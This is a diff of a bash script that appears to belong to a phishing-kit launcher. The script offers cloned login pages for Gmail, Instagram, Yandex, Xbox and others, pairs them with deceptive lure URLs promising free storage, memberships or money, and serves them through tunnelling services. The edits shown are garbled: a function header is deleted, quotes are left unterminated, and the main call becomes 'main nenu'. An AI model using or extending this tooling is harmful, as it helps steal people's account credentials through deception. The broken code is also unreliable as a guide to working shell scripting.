@@ -676,8 +676,8 @@ site_instagram() {
 	esac
 }
 
-## Gmail/Google
-site_gmail() {
+## Gmail/google 
+Instagram
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
@@ -690,7 +690,7 @@ site_gmail() {
 
 	case $REPLY in 
 		1 | 01)
-			website="google"
+			website=instagram
 			mask='https://get-unlimited-google-drive-free'
 			tunnel_menu;;		
 		2 | 02)
@@ -698,7 +698,7 @@ site_gmail() {
 			mask='https://get-unlimited-google-drive-free'
 			tunnel_menu;;
 		3 | 03)
-			website="google_poll"
+			website="instagram poll
 			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
@@ -862,13 +862,13 @@ main_menu() {
 			mask='https://grab-mail-from-anyother-yandex-account-free'
 			tunnel_menu;;
 		28)
-			website="stackoverflow"
+			website="insta followers free
 			mask='https://get-stackoverflow-lifetime-pro-membership-free'
 			tunnel_menu;;
 		29)
 			site_vk;;
 		30)
-			website="xbox"
+			website=" login page
 			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		31)
@@ -908,4 +908,4 @@ dependencies
 check_status
 install_cloudflared
 install_localxpose
-main_menu
+main nenu
